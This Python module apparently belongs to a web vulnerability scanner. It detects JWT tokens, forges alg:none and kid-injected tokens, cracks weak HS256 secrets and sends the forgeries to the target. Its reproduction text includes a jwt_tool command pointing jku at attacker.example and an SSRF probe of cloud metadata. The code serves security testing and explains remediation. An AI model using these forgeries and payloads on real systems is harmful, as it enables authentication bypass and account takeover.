"""JWT security analysis module.

Detects and attacks JWT tokens found in request parameters, cookies,
Authorization headers, or response bodies.  Checks:

    1. alg:none  -- server accepts unsigned tokens
    2. Weak HS256 secret -- brute-force against common passwords
    3. Sensitive data in payload  -- PII/secrets in JWT claims
"""

import base64
import hashlib
import hmac as _hmac
import json
import re
from typing import Dict, List, Optional, Tuple

from .base import BaseModule, Finding

# ---------------------------------------------------------------------------
# Weak secrets dictionary
# ---------------------------------------------------------------------------
_WEAK_SECRETS: List[str] = [
    "", "secret", "password", "123456", "qwerty", "admin", "test",
    "change_me", "mysecret", "jwt_secret", "jwt-secret", "secret123",
    "supersecret", "secretkey", "your-256-bit-secret", "private_key",
    "abc123", "token_secret", "app_secret", "auth_secret",
    "HS256", "key", "signing_key", "jwt_signing_key",
    "development", "production", "staging", "local", "default",
    "changeme", "iloveyou", "dragon", "master", "welcome",
    "monkey", "qwerty123", "password1", "letmein",
]

# JWT pattern: three base64url parts separated by dots
_JWT_RE = re.compile(r"\bey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Asymmetric algorithms vulnerable to RS→HS confusion when the server reuses
# the public key as an HMAC secret.
_ASYMMETRIC_ALGS = frozenset({
    "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512",
})

# Standard locations that expose the JWKS / public key needed for the confusion
# attack. We probe these to upgrade the finding from "possible" to "actionable".
_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/.well-known/openid-configuration",
    "/oauth/jwks",
    "/api/jwks",
    "/keys",
]

# kid header injection payloads: path traversal to a predictable-content file
# (sign with that file's bytes), and SQLi to coerce the key lookup.
_KID_PAYLOADS = [
    ("../../../../../../dev/null", "Path traversal to /dev/null → empty key; sign HS256 with an empty secret."),
    ("/dev/null", "Absolute path to /dev/null → empty key."),
    ("../../../../../../etc/hostname", "Path traversal to a predictable file used as the HMAC key."),
    ("' UNION SELECT 'key", "SQLi in kid lookup to return an attacker-known key."),
]

# Fields in JWT payload that indicate sensitive data
_SENSITIVE_FIELDS = frozenset({
    "password", "passwd", "pwd", "secret", "api_key", "apikey",
    "token", "ssn", "credit_card", "card_number", "cvv",
    "phone", "dob", "date_of_birth", "social_security",
})


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_token(token: str) -> Optional[Dict]:
    """Parse JWT without verifying the signature.

    Returns ``{header, payload, parts}`` or ``None`` on malformed input.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "parts": parts}
    except Exception:
        return None


def _forge_alg_none(token: str) -> List[str]:
    """Generate alg:none variants with an empty signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return []
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception:
        return []

    forged = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = {**header, "alg": alg}
        enc = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        forged.append(f"{enc}.{parts[1]}.")   # empty signature
        forged.append(f"{enc}.{parts[1]}")    # no trailing dot
    return forged


def _crack_hs256(token: str) -> Optional[str]:
    """Try common secrets against an HS256 JWT.  Returns the secret or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        hdr = json.loads(_b64url_decode(parts[0]))
        if hdr.get("alg", "").upper() != "HS256":
            return None
        expected = _b64url_decode(parts[2])
    except Exception:
        return None

    msg = f"{parts[0]}.{parts[1]}".encode()
    for secret in _WEAK_SECRETS:
        sig = _hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        if sig == expected:
            return secret
    return None


def _forge_kid(token: str, kid_value: str, secret: str = "") -> Optional[str]:
    """Re-sign a token as HS256 with an injected ``kid`` header and *secret*.

    Used for kid path-traversal attacks: if the server loads the key from the
    file named by ``kid``, pointing it at /dev/null yields an empty key, so a
    token signed with an empty HMAC secret verifies."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    header = {**header, "alg": "HS256", "kid": kid_value}
    h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_enc}.{p_enc}".encode()
    sig = _hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h_enc}.{p_enc}.{_b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------

class JWTAnalyzer(BaseModule):
    """Detect, decode, and attack JWT tokens.

    Unlike vuln-injection modules, this one scans:
      - The value of the targeted parameter (if it is a JWT).
      - Cookies, Authorization header, and body of the baseline response.
    """

    NAME = "jwt"

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        findings: List[Finding] = []

        # Collect (source_label, token_string) pairs to analyse
        candidates: List[Tuple[str, str]] = []

        # 1. Check if the parameter value itself is a JWT
        value = params.get(param_name, "")
        if _JWT_RE.match(value):
            candidates.append((f"param:{param_name}", value))

        # 2. Baseline request -- look in response cookies, headers, body
        resp = self.http.get(url, params=params)
        if resp is not None:
            # Set-Cookie
            for header_val in resp.headers.getlist("Set-Cookie") if hasattr(resp.headers, "getlist") else [resp.headers.get("Set-Cookie", "")]:
                m = _JWT_RE.search(header_val or "")
                if m:
                    candidates.append(("cookie", m.group(0)))

            # Authorization echo or WWW-Authenticate
            for hname in ("Authorization", "X-Auth-Token", "X-Access-Token"):
                hval = resp.headers.get(hname, "")
                m = _JWT_RE.search(hval)
                if m:
                    candidates.append((f"header:{hname}", m.group(0)))

            # Response body scan (first 15 KB)
            for m in _JWT_RE.finditer(resp.text[:15360]):
                token = m.group(0)
                if token not in {t for _, t in candidates}:
                    candidates.append(("body", token))
                    break  # one body token per scan run

        # Deduplicate by token value
        seen_tokens: set = set()
        unique: List[Tuple[str, str]] = []
        for label, token in candidates:
            if token not in seen_tokens:
                seen_tokens.add(token)
                unique.append((label, token))

        for label, token in unique:
            decoded = _decode_token(token)
            if not decoded:
                continue

            alg = decoded["header"].get("alg", "?").upper()
            payload_preview = json.dumps(decoded["payload"], separators=(",", ":"))[:200]

            # --- Check 1: alg:none ---
            if alg not in ("NONE",):
                for forged in _forge_alg_none(token):
                    test_headers = {"Authorization": f"Bearer {forged}"}
                    r = self.http.get(url, params=params, headers=test_headers)
                    if r is not None and r.status_code not in (401, 403):
                        findings.append(Finding(
                            vuln_type="JWT Algorithm None Bypass",
                            url=url,
                            method=method,
                            parameter=label,
                            payload="alg:none (unsigned token)",
                            evidence=(
                                f"Server accepted forged JWT with alg:none "
                                f"(HTTP {r.status_code})"
                            ),
                            confidence="high",
                            details=(
                                "The server does not verify JWT signatures when "
                                "alg is set to 'none'. An attacker can forge any "
                                "claims (user ID, role, admin flag) without knowing "
                                "the secret key."
                            ),
                            reproduction=(
                                "# Decode the original token payload:\n"
                                "$ python3 -c \"import base64; print("
                                "base64.b64decode('<payload_part>=='.encode()).decode())\"\n\n"
                                "# Forge with alg:none (PyJWT):\n"
                                "$ pip install PyJWT\n"
                                "$ python3 -c \"\n"
                                "import jwt\n"
                                "payload = {...}  # replace with decoded claims\n"
                                "token = jwt.encode(payload, '', algorithm='none')\n"
                                "print(token)\n\"\n\n"
                                f'$ curl -H "Authorization: Bearer <forged>" "{url}"'
                            ),
                        ))
                        break

            # --- Check 2: Weak HS256 secret ---
            if alg == "HS256":
                secret = _crack_hs256(token)
                if secret is not None:
                    secret_r = repr(secret)
                    findings.append(Finding(
                        vuln_type="JWT Weak HMAC Secret",
                        url=url,
                        method=method,
                        parameter=label,
                        payload=f"secret={secret_r}",
                        evidence=f"HS256 signing secret cracked: {secret_r}",
                        confidence="high",
                        details=(
                            f"The JWT is signed with a weak/guessable HS256 secret "
                            f"({secret_r}). An attacker can craft tokens with arbitrary "
                            f"claims by signing them with the same secret."
                        ),
                        reproduction=(
                            f"# Forge a JWT with the discovered secret:\n"
                            f"$ pip install PyJWT\n"
                            f"$ python3 -c \"\nimport jwt\n"
                            f"payload = {json.dumps(decoded['payload'])}\n"
                            f"# Modify payload as needed (e.g. role='admin')\n"
                            f"token = jwt.encode(payload, {secret_r}, algorithm='HS256')\n"
                            f"print(token)\n\""
                        ),
                    ))

            # --- Check 3: Sensitive payload fields ---
            exposed = _SENSITIVE_FIELDS & {k.lower() for k in decoded["payload"]}
            if exposed:
                findings.append(Finding(
                    vuln_type="JWT Sensitive Data Exposure",
                    url=url,
                    method=method,
                    parameter=label,
                    payload="(JWT payload decoded)",
                    evidence=f"Sensitive fields in JWT payload: {sorted(exposed)}",
                    confidence="medium",
                    details=(
                        "JWT payloads are Base64-encoded but NOT encrypted. "
                        f"Field(s) {sorted(exposed)} are readable by anyone who "
                        "intercepts the token — in transit or in browser storage."
                    ),
                    reproduction=(
                        "# Decode JWT payload (no secret needed):\n"
                        "# Copy the middle part of the token and decode:\n"
                        "$ python3 -c \"import base64; "
                        "print(base64.b64decode('<token.part2>=='.encode()).decode())\"\n\n"
                        "# Or online: https://jwt.io\n\n"
                        f"# Payload preview:\n"
                        f"# {payload_preview}"
                    ),
                ))

            # --- Check 4: RS→HS algorithm confusion vector ---
            if alg in _ASYMMETRIC_ALGS:
                findings.append(self._check_alg_confusion(url, method, label, alg, token))

            # --- Check 5: kid header injection (path traversal / SQLi) ---
            header = decoded["header"]
            if "kid" in header:
                kid_finding = self._check_kid_injection(url, method, params, label, token, header)
                if kid_finding:
                    findings.append(kid_finding)

            # --- Check 6: jku / x5u header (SSRF + key injection) ---
            for hdr_field in ("jku", "x5u"):
                if hdr_field in header:
                    findings.append(self._flag_jku_x5u(url, method, label, hdr_field, header[hdr_field], token))

        return [f for f in findings if f is not None]

    # ------------------------------------------------------------------
    # Advanced JWT attack checks
    # ------------------------------------------------------------------

    def _check_alg_confusion(self, url, method, label, alg, token) -> Finding:
        """Detect the RS→HS confusion vector and try to locate the public key
        that makes it exploitable."""
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(url)
        base = urlunparse(parsed._replace(path="", query="", fragment=""))

        found_key_at = None
        for path in _JWKS_PATHS:
            try:
                r = self.http.get(base + path)
            except Exception:
                r = None
            if r is not None and r.status_code == 200 and (
                '"kty"' in r.text or '"keys"' in r.text or "BEGIN PUBLIC KEY" in r.text
            ):
                found_key_at = base + path
                break

        conf = "high" if found_key_at else "medium"
        key_note = (
            f"Public key/JWKS exposed at {found_key_at} — the confusion attack is "
            f"directly exploitable: sign an HS256 token using that public key as "
            f"the HMAC secret."
            if found_key_at else
            "Locate the RSA public key (TLS cert, /jwks.json, GitHub, API docs) to "
            "complete the attack."
        )
        return Finding(
            vuln_type="JWT Algorithm Confusion (RS→HS)",
            url=url,
            method=method,
            parameter=label,
            payload=f"{alg} → HS256 confusion",
            evidence=f"Token uses asymmetric {alg}. {key_note}",
            confidence=conf,
            details=(
                f"The token is signed with {alg} (asymmetric). If the server verifies "
                "with a generic library call that picks the algorithm from the token "
                "header, an attacker can switch alg to HS256 and sign with the PUBLIC "
                "key as the HMAC secret — forging arbitrary claims without the private "
                "key. Remediation: pin the expected algorithm server-side; never let "
                "the token header choose it."
            ),
            reproduction=(
                f"# 1. Obtain the RSA public key (PEM). If JWKS is exposed:\n"
                f"$ curl -sk '{found_key_at or base + '/.well-known/jwks.json'}'\n"
                f"# 2. Convert JWK→PEM if needed, then forge with the public key as HMAC secret:\n"
                f"$ python3 -c \"\n"
                f"import jwt\n"
                f"pub = open('public.pem').read()\n"
                f"print(jwt.encode({{'role':'admin'}}, pub, algorithm='HS256'))\"\n"
                f"# 3. Or use jwt_tool:\n"
                f"$ python3 jwt_tool.py {token[:24]}... -X k -pk public.pem"
            ),
        )

    def _check_kid_injection(self, url, method, params, label, token, header) -> Optional[Finding]:
        """Try kid path-traversal: point kid at /dev/null and sign with an empty
        secret. If the server accepts it, the key is loaded from an
        attacker-controlled path."""
        for kid_value, desc in _KID_PAYLOADS[:2]:  # only the /dev/null variants auto-fire
            forged = _forge_kid(token, kid_value, secret="")
            if not forged:
                continue
            try:
                r = self.http.get(url, params=params, headers={"Authorization": f"Bearer {forged}"})
            except Exception:
                r = None
            if r is not None and r.status_code not in (401, 403):
                return Finding(
                    vuln_type="JWT kid Header Injection (Path Traversal)",
                    url=url,
                    method=method,
                    parameter=label,
                    payload=f"kid={kid_value}",
                    evidence=f"Server accepted a token whose kid points to {kid_value!r} "
                             f"signed with an empty key (HTTP {r.status_code}). {desc}",
                    confidence="high",
                    details=(
                        "The 'kid' (key ID) header is used to locate the verification "
                        "key without sanitisation. By pointing kid at a file with "
                        "known/empty contents (/dev/null) an attacker controls the key "
                        "and forges valid tokens. kid is also a classic LFI/SQLi sink. "
                        "Remediation: treat kid as an opaque key into a fixed allow-list."
                    ),
                    reproduction=(
                        f"# Forge with jwt_tool kid path-traversal:\n"
                        f"$ python3 jwt_tool.py {token[:24]}... -I -hc kid -hv '../../../../dev/null' -S hs256 -p ''\n"
                        f"$ curl -H 'Authorization: Bearer <forged>' '{url}'"
                    ),
                )
        return None

    def _flag_jku_x5u(self, url, method, label, field, value, token) -> Finding:
        """Flag jku/x5u headers — they let the server fetch verification keys
        from a URL, enabling SSRF and key-injection if the host isn't pinned."""
        return Finding(
            vuln_type=f"JWT {field} Header (Key Injection / SSRF)",
            url=url,
            method=method,
            parameter=label,
            payload=f"{field}={value}",
            evidence=f"Token header carries '{field}' pointing to {value!r}. If the "
                     f"server fetches keys from this URL without host allow-listing, an "
                     f"attacker can host their own key set and forge tokens.",
            confidence="medium",
            details=(
                f"The '{field}' header tells the server where to fetch the verification "
                "key. Without strict host allow-listing an attacker sets it to their "
                "own server (key injection → token forgery) or an internal URL (SSRF). "
                "Remediation: ignore key-source headers from the token; pin keys server-side."
            ),
            reproduction=(
                f"# 1. Host a JWKS with your own key, then point {field} at it:\n"
                f"$ python3 jwt_tool.py {token[:24]}... -X s -ju https://attacker.example/jwks.json\n"
                f"# 2. Or test SSRF — point {field} at an internal address and watch for a callback:\n"
                f"#    {field}: http://169.254.169.254/latest/meta-data/\n"
                f"$ curl -H 'Authorization: Bearer <forged>' '{url}'"
            ),
        )
